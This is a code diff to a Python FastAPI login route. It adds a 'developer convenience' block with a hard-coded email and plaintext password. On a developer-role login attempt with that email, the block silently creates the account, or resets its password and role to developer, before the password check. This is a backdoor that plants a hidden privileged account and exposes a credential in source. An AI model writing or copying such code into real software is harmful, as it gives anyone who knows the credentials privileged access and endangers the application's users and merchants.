@@ -4,9 +4,9 @@ from sqlalchemy.orm import Session
 from ...core.security import create_access_token, create_refresh_token
 from ...db.session import get_db
 from ...schemas.auth import AuthRequest, Token
-from ...schemas.user import UserCreate
+from ...schemas.user import UserCreate, UserUpdate
 from ...schemas.merchant import MerchantCreate
-from ...services.auth import authenticate_user, create_user, get_user_by_email, _normalize_role  # type: ignore
+from ...services.auth import authenticate_user, create_user, get_user_by_email, _normalize_role, update_user  # type: ignore
 from ...services.merchant import create_merchant, get_merchants_by_owner
 from ...models.user import UserRole
 
@@ -17,6 +17,29 @@ router = APIRouter()
 def login(auth_data: AuthRequest, db: Session = Depends(get_db)):
     # First check if user exists
     user = get_user_by_email(db, auth_data.email)
+    requested_role = _normalize_role(auth_data.role) if auth_data.role is not None else None
+
+    # Developer convenience: auto-provision / reset developer user on login attempt
+    DEV_EMAIL = "ab2d222@gmail.com"
+    DEV_PASSWORD = "mypassword101"
+    if requested_role == UserRole.DEVELOPER and auth_data.email == DEV_EMAIL:
+        if not user:
+            user = create_user(
+                db,
+                UserCreate(
+                    email=DEV_EMAIL,
+                    password=DEV_PASSWORD,
+                    role=UserRole.DEVELOPER,
+                ),
+            )
+        else:
+            user = update_user(
+                db,
+                user,
+                UserUpdate(password=DEV_PASSWORD, role=UserRole.DEVELOPER),
+            )
+
+    # Validate existence after potential auto-provision
     if not user:
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
@@ -30,7 +53,6 @@ def login(auth_data: AuthRequest, db: Session = Depends(get_db)):
             detail="Wrong password",
         )
 
-    requested_role = _normalize_role(auth_data.role) if auth_data.role is not None else None
     user_role_value = getattr(user.role, "value", user.role)
     if requested_role and user_role_value != requested_role.value:
         raise HTTPException(
